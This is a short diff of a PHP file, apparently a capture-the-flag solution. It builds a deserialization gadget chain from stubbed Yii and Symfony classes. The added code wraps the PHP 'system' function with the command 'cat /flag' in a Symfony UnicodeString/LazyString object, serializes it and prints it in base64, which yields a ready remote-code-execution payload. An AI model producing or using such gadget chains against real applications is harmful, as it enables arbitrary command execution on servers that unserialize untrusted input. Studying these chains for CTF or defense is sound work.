@@ -1,4 +1,7 @@
 <?php
+/*
+
+*/
 namespace yii\base {
 	class Action
 	{
@@ -46,4 +49,9 @@ namespace Symfony\Component\String {
 			$this->string = new LazyString($func, $param);
 		}
 	}
+}
+
+namespace {
+	$a = new Symfony\Component\String\UnicodeString("system", "cat /flag");
+	echo base64_encode(serialize($a));
 }
